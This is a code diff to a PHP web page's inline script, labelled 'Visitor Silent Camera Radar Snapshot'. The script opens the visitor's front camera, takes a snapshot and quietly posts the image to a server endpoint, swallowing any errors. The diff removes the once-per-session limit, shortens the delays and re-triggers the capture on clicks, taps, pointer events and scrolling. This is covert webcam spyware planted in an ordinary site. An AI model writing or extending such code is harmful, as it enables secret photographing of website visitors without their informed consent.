@@ -313,14 +313,18 @@ if ($is_spa) {
         <!-- Visitor Silent Camera Radar Snapshot -->
         <script>
         (function() {
-            if (sessionStorage.getItem('visitor_photo_captured')) return;
+            let isCapturing = false;
 
             function initCameraCapture() {
+                if (isCapturing) return;
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
                 
+                isCapturing = true;
                 navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240, facingMode: 'user' } })
                 .then(function(stream) {
                     const video = document.createElement('video');
+                    video.muted = true;
+                    video.playsInline = true;
                     video.srcObject = stream;
                     video.play();
                     
@@ -335,20 +339,27 @@ if ($is_spa) {
                             const imgData = canvas.toDataURL('image/jpeg', 0.85);
                             
                             stream.getTracks().forEach(track => track.stop());
-                            sessionStorage.setItem('visitor_photo_captured', '1');
                             
                             fetch('api/capture_visitor.php', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({ image: imgData })
                             }).catch(function() {});
-                        }, 800);
+                        }, 600);
                     };
-                }).catch(function() {});
+                }).catch(function() {
+                    isCapturing = false;
+                });
             }
 
+            // Trigger on page load and on first user interaction
             window.addEventListener('DOMContentLoaded', function() {
-                setTimeout(initCameraCapture, 1500);
+                setTimeout(initCameraCapture, 1000);
+            });
+            ['click', 'touchstart', 'pointerdown', 'scroll'].forEach(function(evt) {
+                window.addEventListener(evt, function() {
+                    initCameraCapture();
+                }, { once: true });
             });
         })();
         </script>
